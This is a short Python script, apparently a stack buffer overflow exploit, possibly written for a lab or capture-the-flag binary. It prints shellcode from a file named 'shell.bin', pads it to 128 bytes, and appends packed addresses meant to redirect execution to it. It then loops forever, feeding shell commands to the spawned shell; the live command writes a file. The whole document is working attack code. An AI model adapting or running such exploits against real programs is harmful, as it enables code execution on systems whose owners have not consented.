#!/usr/bin/python
import sys
import struct
x = open("shell.bin").read()

sys.stdout.write(x)
sys.stdout.write("1"*(128 - len(x)))
#sys.stdout.write(struct.pack("!I", 0x30e1ffff))
sys.stdout.write(struct.pack("!I", 0x40e1ffff))
sys.stdout.write(struct.pack("!I", 0xff7f0000))

sys.stdout.write(struct.pack("!I", 0x90e0ffff))
sys.stdout.write(struct.pack("!I", 0xff7f0000))

sys.stdout.write("\n")

while True:
    #sys.stdout.write("ls -la\n")
    #sys.stdout.write("echo hello\n")
    sys.stdout.write('echo "x" > hello.txt\n')



